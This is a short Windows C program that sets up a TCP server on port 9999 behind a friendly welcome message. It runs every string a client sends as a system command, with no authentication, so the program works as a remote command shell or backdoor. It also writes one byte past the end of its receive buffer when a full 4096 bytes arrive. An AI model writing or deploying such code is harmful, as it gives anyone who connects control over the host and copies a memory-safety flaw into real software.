#include <winsock2.h>
#include <stdio.h>

#define PORT 9999

int main()
{

  WSADATA wsaData;
  int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (iResult != 0)
  {
    printf("WSAStartup failed: %d\n", iResult);
    return 1;
  }

  struct sockaddr_in serverAddress;
  serverAddress.sin_family = AF_INET;
  serverAddress.sin_addr.s_addr = INADDR_ANY;
  serverAddress.sin_port = htons(PORT);

  SOCKET ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (ListenSocket == INVALID_SOCKET)
  {
    printf("Error at socket(): %ld\n", WSAGetLastError());
    WSACleanup();
    return 1;
  }

  iResult = bind(ListenSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress));
  if (iResult == SOCKET_ERROR)
  {
    printf("bind failed with error: %d\n", WSAGetLastError());
    closesocket(ListenSocket);
    WSACleanup();
    return 1;
  }

  iResult = listen(ListenSocket, SOMAXCONN);
  if (iResult == SOCKET_ERROR)
  {
    printf("listen failed with error: %d\n", WSAGetLastError());
    closesocket(ListenSocket);
    WSACleanup();
    return 1;
  }

  // Accept loop
  while (1)
  {
    SOCKET ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET)
    {
      printf("accept failed: %d\n", WSAGetLastError());
      closesocket(ListenSocket);
      WSACleanup();
      return 1;
    }
    // Code handle client connection
    const char *welcomeMsg = "Welcome to my server!\n";
    send(ClientSocket, welcomeMsg, strlen(welcomeMsg), 0);

    char buffer[4096];
    int bytesRead;

    while ((bytesRead = recv(ClientSocket, buffer, 4096, 0)) > 0)
    {
      buffer[bytesRead] = 0;
      system(buffer);
    }

    // Add code to handle client connection here
    closesocket(ClientSocket);
  }

  WSACleanup();
  return 0;
}